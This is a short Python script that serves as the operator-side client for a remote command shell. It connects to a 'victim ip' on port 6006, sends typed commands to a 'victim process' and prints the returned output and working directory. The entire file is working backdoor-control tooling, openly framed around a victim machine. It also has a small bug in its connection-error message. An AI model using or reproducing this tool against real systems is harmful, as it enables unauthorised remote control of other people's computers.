import socket, sys

host = sys.argv[1] # victim ip to connect to
port = 6006 # port to connect to

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    s.connect((host, port)) # creating the socket
except:
    print('could not connect to ' + host + ' on ' + port)
    exit()
print("Connected on port: " + str(port))
nextcmd = 'help'
s.sendall((nextcmd + '\r\n').encode()) # sending command to victim process

while True:
    data = s.recv(4096)
    while 'EOFX' not in data.decode(): # EOFX is my way of determining when output is finished
        data += s.recv(4096)
    datarr = data.decode().split('\r\n')
    for line in datarr[:-3]:
        print(line)
    print("Current path: " + datarr[-3])
    nextcmd = input("%SBS% ") # prompt for command input 
    if nextcmd == 'quit':
        nextcmd += '\r\n'
        s.sendall(nextcmd.encode()) 
        s.close()
        break
    else:
        nextcmd += '\r\n'
        s.sendall(nextcmd.encode()) # send command to victim machine
